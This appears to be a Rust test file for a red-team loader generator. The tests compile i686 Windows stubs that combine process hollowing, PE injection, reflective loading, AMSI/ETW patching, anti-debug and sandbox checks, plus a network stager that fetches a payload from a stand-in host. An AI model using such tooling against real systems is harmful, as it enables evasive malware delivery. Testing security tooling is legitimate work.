fn render_custom(template: &str, pipeline: &[crate::techniques::RuntimeStep]) -> String {
    let plaintext: Vec<u8> = (0..64u32).map(|i| i as u8).collect();
    let key = crate::engine::crypto::generate_key();
    let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();
    let params = crate::engine::steps::test_params(
        pipeline,
        &encrypted,
        "payload.bin",
        PayloadFormat::Pe,
        None,
        false,
    );
    crate::engine::steps::render_custom(
        template,
        &params,
        &crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap(),
        &crate::engine::syscalls::SyscallsConfig::default(),
        &crate::engine::api_resolution::ApiResolutionConfig::default(),
    )
    .unwrap()
    .source
}

/// Renders the builtin stub template for a pipeline with an explicit payload
/// format (see [`render_builtin`]).
#[cfg(feature = "live-tests")]
fn render_builtin_for(
    pipeline: &[crate::techniques::RuntimeStep],
    format: PayloadFormat,
) -> (String, Vec<u8>) {
    let template = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("src")
            .join("engine")
            .join("templates")
            .join("main.rs.tpl"),
    )
    .unwrap();

    let plaintext: Vec<u8> = (0..256u32).map(|i| i as u8).collect();
    let key = crate::engine::crypto::generate_key();
    let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();
    let params =
        crate::engine::steps::test_params(pipeline, &encrypted, "payload.bin", format, None, false);
    let source = crate::engine::steps::render_builtin(
        &template,
        &params,
        &crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap(),
        &crate::engine::syscalls::SyscallsConfig::default(),
        &crate::engine::api_resolution::ApiResolutionConfig::default(),
    )
    .unwrap();
    (source, encrypted.ciphertext)
}

/// Renders the builtin stub template for a pipeline, returning the source and
/// the ciphertext to write as `payload.bin` next to it (the builtin template
/// `include_bytes!`s the payload).
#[cfg(feature = "live-tests")]
fn render_builtin(pipeline: &[crate::techniques::RuntimeStep]) -> (String, Vec<u8>) {
    render_builtin_for(pipeline, PayloadFormat::Pe)
}

/// Compiles `source` for i686 (writing `payload.bin` when the template needs
/// it) and returns the parsed artifact.
#[cfg(feature = "live-tests")]
fn compile_i686(source: &str, payload: Option<&[u8]>, name: &str) -> crate::engine::pe::PeInfo {
    // `name` is not unique across tests: the technique sweep compiles the
    // same technique as its per-technique test (both use `dotnet_hosting`,
    // for example). A per-call counter keeps parallel runs from sharing —
    // and wiping — each other's scratch directory.
    static SCRATCH_SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let seq = SCRATCH_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let build_dir =
        std::env::temp_dir().join(format!("picaro_i686_{name}_{}_{seq}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();

    if let Some(bytes) = payload {
        std::fs::write(build_dir.join("payload.bin"), bytes).unwrap();
    }
    let stub_path = build_dir.join("main.rs");
    std::fs::write(&stub_path, source).unwrap();

    let deps = locate_stub_deps(Arch::X86).unwrap();
    let out = build_dir.join("out.exe");
    compile_stub(
        &stub_path,
        &out,
        &deps,
        CompileOptions {
            arch: Arch::X86,
            ..CompileOptions::default()
        },
    )
    .unwrap();

    let bytes = std::fs::read(&out).unwrap();
    let info = crate::engine::pe::parse(&bytes).unwrap();
    let _ = std::fs::remove_dir_all(&build_dir);
    info
}

/// M0: picaro compiles a valid **i686** stub. The custom template ignores the
/// technique blocks, so this exercises the toolchain (target selection, i686
/// dependency set, `windows_i686_*` import lib, `--target` on a Windows host)
/// while every technique fragment is still x64-only.
///
/// Marked `#[ignore]` because it needs `rustc` and the workspace built for
/// the i686 target: `cargo build --target i686-pc-windows-msvc` (or
/// `i686-pc-windows-gnu` off Windows).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn compiles_an_i686_stub() {
    let template = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("examples")
            .join("stubs")
            .join("minimal.rs"),
    )
    .unwrap();
    let source = render_custom(&template, &[]);

    let info = compile_i686(&source, None, "minimal");
    assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
    assert_eq!(info.arch(), Some(Arch::X86));
}

/// M0: the shared blocks (payload arguments and the import resolver) compile
/// for i686, including their x86 branches (`fs:[0x30]`, the 32-bit PEB
/// offsets, 4-byte thunks and `IMAGE_ORDINAL_FLAG32`).
///
/// The pipeline is only there to make the renderer emit `$ARGS_BLOCK$` /
/// `$IMPORTS_BLOCK$`; the template ignores `$STEP_MODULES$`, so no x64
/// technique fragment is linked in.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn compiles_the_shared_blocks_for_i686() {
    const TEMPLATE: &str = r#"
// The builtin template provides `dec_xor`; a custom stub that pulls in the
// obfuscated blocks has to provide it too.
#[inline(never)]
#[allow(dead_code)]
fn dec_xor(bytes: &[u8], key: &[u8; 32]) -> Vec<u8> {
    let mut out = bytes.to_vec();
    for (i, b) in out.iter_mut().enumerate() {
        *b ^= key[i % 32];
    }
    out
}

fn main() {}

$SYSCALLS_BLOCK$
$TLS_HANDOFF_BLOCK$
$ARGS_BLOCK$
$IMPORTS_BLOCK$
"#;

    let pipeline = vec![RuntimeStep::new(TechniqueKind::ReflectiveLoading {
        params: crate::techniques::reflective_loading::Params::default(),
    })];
    let source = render_custom(TEMPLATE, &pipeline);
    assert!(source.contains("fs:[0x30]"), "the x86 PEB read is missing");
    assert!(
        source.contains("IMAGE_ORDINAL_FLAG32"),
        "the PE32 ordinal flag is missing"
    );

    let info = compile_i686(&source, None, "shared_blocks");
    assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
}

/// M1: the reflective-loading fragment compiles for i686 — the PE32 mapper,
/// the hand-defined 32-bit `IMAGE_TLS_DIRECTORY` and the x86 entry call.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn compiles_a_reflective_stub_for_i686() {
    let pipeline = vec![RuntimeStep::new(TechniqueKind::ReflectiveLoading {
        params: crate::techniques::reflective_loading::Params::default(),
    })];
    let (source, ciphertext) = render_builtin(&pipeline);

    let info = compile_i686(&source, Some(&ciphertext), "reflective");
    assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
    assert_eq!(info.arch(), Some(Arch::X86));
}

/// M2: the process-hollowing fragment compiles for i686 — PE32 parsing,
/// `CONTEXT32`, the `fs:[0x2C]` TLS array and the 32-bit `THREAD_BASIC_INFORMATION`.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn compiles_a_hollowing_stub_for_i686() {
    let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
        params: crate::techniques::process_hollowing::Params::default(),
    })];
    let (source, ciphertext) = render_builtin(&pipeline);

    let info = compile_i686(&source, Some(&ciphertext), "hollowing");
    assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
    assert_eq!(info.arch(), Some(Arch::X86));
}

/// M2-bis: the PE-injection fragment compiles for i686 — the PE32 parser and
/// the target-resident TLS prologue (hand-written x86 machine code that runs
/// `TlsSetValue` + the payload's callbacks before the entry point).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn compiles_a_pe_injection_stub_for_i686() {
    let pipeline = vec![RuntimeStep::new(TechniqueKind::PeInjection {
        params: crate::techniques::pe_injection::Params::default(),
    })];
    let (source, ciphertext) = render_builtin(&pipeline);

    let info = compile_i686(&source, Some(&ciphertext), "pe_injection");
    assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
    assert_eq!(info.arch(), Some(Arch::X86));
}

/// M3: every x86-capable Preparation compiles for i686 next to an execution
/// technique — `anti_debug`'s x86 debug-register `CONTEXT`, the arch-neutral
/// AMSI/ETW patches and the `bouncer`'s Win32 checks.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn compiles_the_x86_preparations_for_i686() {
    use crate::techniques::{anti_debug, bouncer, patch_amsi, patch_etw, reflective_loading};
    let pipeline = vec![
        RuntimeStep::new(TechniqueKind::AntiDebug {
            params: anti_debug::Params::default(),
        }),
        RuntimeStep::new(TechniqueKind::PatchAmsi {
            params: patch_amsi::Params::default(),
        }),
        RuntimeStep::new(TechniqueKind::PatchEtw {
            params: patch_etw::Params::default(),
        }),
        RuntimeStep::new(TechniqueKind::Bouncer {
            params: bouncer::Params {
                require: vec![
                    bouncer::Requirement::Hostname("WORKSTATION-*".to_string()),
                    bouncer::Requirement::RamMb(2048),
                ],
                anti_analysis: bouncer::AntiAnalysis {
                    hypervisor: true,
                    sandbox: false,
                },
                ..bouncer::Params::default()
            },
        }),
        RuntimeStep::new(TechniqueKind::ReflectiveLoading {
            params: reflective_loading::Params::default(),
        }),
    ];
    let (source, ciphertext) = render_builtin(&pipeline);

    let info = compile_i686(&source, Some(&ciphertext), "preparations");
    assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
    assert_eq!(info.arch(), Some(Arch::X86));
}

/// M5: the `dotnet_hosting` fragment compiles for i686 — the COM vtable
/// calls, the 16-byte `VARIANT` layout and the x86 `Invoke_3` ABI (the
/// variant passed by value, not by reference as on x64).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn compiles_a_dotnet_hosting_stub_for_i686() {
    let pipeline = vec![RuntimeStep::new(TechniqueKind::DotnetHosting {
        params: crate::techniques::dotnet_hosting::Params::default(),
    })];
    let (source, ciphertext) = render_builtin(&pipeline);

    let info = compile_i686(&source, Some(&ciphertext), "dotnet_hosting");
    assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
    assert_eq!(info.arch(), Some(Arch::X86));
}

/// Compatibility net: **every** x86-capable technique renders and compiles for
/// i686, driven by the registry instead of a hardcoded list. A technique that
/// declares `WindowsX86` but emits an x64-only fragment fails here; the
/// x64-only set is asserted too, so dropping the capability is a deliberate
/// edit rather than a silent regression.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn every_x86_technique_compiles_for_i686() {
    use crate::techniques::{Capability, RuntimeStep};

    let mut x64_only: Vec<&str> = Vec::new();
    let mut covered: Vec<&str> = Vec::new();
    for def in crate::techniques::all() {
        if !def.requires.contains(&Capability::WindowsX86) {
            x64_only.push(def.name);
            continue;
        }
        let step: RuntimeStep = serde_yml::from_str(def.params_example)
            .unwrap_or_else(|e| panic!("{}: params_example does not parse: {e}", def.name));
        let format = def.formats.first().copied().unwrap_or(PayloadFormat::Pe);
        let (source, ciphertext) = render_builtin_for(std::slice::from_ref(&step), format);
        let info = compile_i686(&source, Some(&ciphertext), def.name);
        assert_eq!(
            info.machine,
            crate::engine::pe::IMAGE_FILE_MACHINE_I386,
            "{}: the i686 stub did not come out as PE32",
            def.name
        );
        covered.push(def.name);
    }

    x64_only.sort_unstable();
    assert_eq!(
        x64_only,
        vec!["hardware_breakpoints", "sleep_obfuscation", "veh_execution"],
        "the x64-only set changed; update this assertion deliberately"
    );
    assert!(
        covered.len() >= 25,
        "only {} x86 techniques were covered",
        covered.len()
    );
}

/// The network stager's two transports: the child-process downloader
/// (`curl`) and the in-process WinHTTP fetch. Both have to type-check and
/// link for i686, where `extern "system"` is stdcall and pointers are four
/// bytes.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn compiles_both_stager_transports_for_i686() {
    use crate::techniques::RuntimeStep;

    for (downloader, name) in [("curl", "stager_curl"), ("winhttp", "stager_winhttp")] {
        let yaml = format!(
                "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/a.bin\"\n  downloader: {downloader}\n"
            );
        let step: RuntimeStep =
            serde_yml::from_str(&yaml).unwrap_or_else(|e| panic!("{name}: {e}"));
        let (source, ciphertext) =
            render_builtin_for(std::slice::from_ref(&step), PayloadFormat::Pe);
        let info = compile_i686(&source, Some(&ciphertext), name);
        assert_eq!(
            info.machine,
            crate::engine::pe::IMAGE_FILE_MACHINE_I386,
            "{name}: the i686 stub did not come out as PE32"
        );
    }
}

/// The .NET acceptance shape for x86: every x86-capable Preparation plus a
/// 32-bit C# payload (`dotnet_hosting`) in **one** stub, so the interactions
/// (the syscall union, helper names, the shared blocks) are compiled too, not
/// just each technique alone.
///
/// This is a *compile* net for the combination a 32-bit managed tool uses; it
/// does not claim the combination is semantically sound (a plan still has to
/// order its steps correctly).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the workspace built for the i686 target"]
fn every_x86_preparation_compiles_with_dotnet_hosting_for_i686() {
    use crate::techniques::{Capability, Category, RuntimeStep, TechniqueKind};

    let mut pipeline: Vec<RuntimeStep> = Vec::new();
    for def in crate::techniques::all() {
        if def.category != Category::Preparation || !def.requires.contains(&Capability::WindowsX86)
        {
            continue;
        }
        let step: RuntimeStep = serde_yml::from_str(def.params_example)
            .unwrap_or_else(|e| panic!("{}: params_example does not parse: {e}", def.name));
        pipeline.push(step);
    }
    pipeline.push(RuntimeStep::new(TechniqueKind::DotnetHosting {
        params: crate::techniques::dotnet_hosting::Params::default(),
    }));

    let (source, ciphertext) = render_builtin_for(&pipeline, PayloadFormat::Dotnet);
    let info = compile_i686(&source, Some(&ciphertext), "x86_dotnet_stack");
    assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
    assert_eq!(info.arch(), Some(Arch::X86));
}
